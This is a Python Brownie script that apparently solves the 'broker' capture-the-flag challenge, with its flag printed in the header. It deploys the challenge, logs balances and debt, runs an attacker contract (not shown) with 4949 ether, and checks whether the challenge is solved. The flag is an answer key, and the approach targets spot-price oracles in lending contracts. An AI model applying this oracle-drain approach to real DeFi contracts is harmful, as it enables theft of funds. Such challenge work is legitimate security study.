from brownie import (
    Contract,
    interface,
    Broker,
    BrokerSetup,
    BrokerToken,
    BrokerAttacker,
)
from web3 import Web3
import time, sys
from scripts.helpful_scripts import get_accounts

"""
name: broker
author: gakonst
flag: PCTF{SP07_0R4CL3S_L0L}
tags: ["pwn"]
description: |
    This broker has pretty good rates
"""


def deploy():
    global deployer, attacker, setup_contract, broker_contract, pair_contract, weth_contract, token_contract, router_contract
    [deployer, attacker] = get_accounts(2)

    # 部署合约
    setup_contract = BrokerSetup.deploy(
        {"from": deployer, "value": Web3.toWei(50, "ether")}
    )
    broker_contract = Broker.at(setup_contract.broker())
    router_contract = interface.IUniswapV2Router02(
        "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"
    )
    pair_contract = interface.IUniswapV2Pair(setup_contract.pair())
    weth_contract = interface.IWETH9(setup_contract.weth())
    token_contract = BrokerToken.at(setup_contract.token())


def print_state(
    setup_contract,
    broker_contract,
    pair_contract,
    weth_contract,
    token_contract,
    attacker,
):
    print("Attacker balances:")
    print("ETH:", Web3.fromWei(attacker.balance(), "ether"))
    print("WETH:", Web3.fromWei(weth_contract.balanceOf(attacker), "ether"))
    print("Tokens:", Web3.fromWei(token_contract.balanceOf(attacker), "ether"))
    print()
    print("Broker balances:")
    print("ETH:", Web3.fromWei(broker_contract.balance(), "ether"))
    print("WETH:", Web3.fromWei(weth_contract.balanceOf(broker_contract), "ether"))
    print("Tokens:", Web3.fromWei(token_contract.balanceOf(broker_contract), "ether"))
    print()
    print("Reserves:", pair_contract.getReserves())
    print("Rate:", broker_contract.rate())
    print("Debt of setup:", broker_contract.debt(setup_contract))
    print("Safe debt of setup:", broker_contract.safeDebt(setup_contract))
    print()


def attack():
    # 攻击代码写到这里
    print_state(
        setup_contract,
        broker_contract,
        pair_contract,
        weth_contract,
        token_contract,
        attacker,
    )
    attack_contrack = BrokerAttacker.deploy(setup_contract, {"from": attacker})
    attack_contrack.attack({"from": attacker, "value": Web3.toWei(4949, "ether")}).wait(
        1
    )
    return


def check():
    # 检测攻击是否完成： 不能继续借贷
    print("running func check..")
    try:
        assert setup_contract.isSolved()
        print("success!")
    except:
        time.sleep(1)
        print("Not pass yet ;(")

    return


def main():
    deploy()
    attack()
    check()
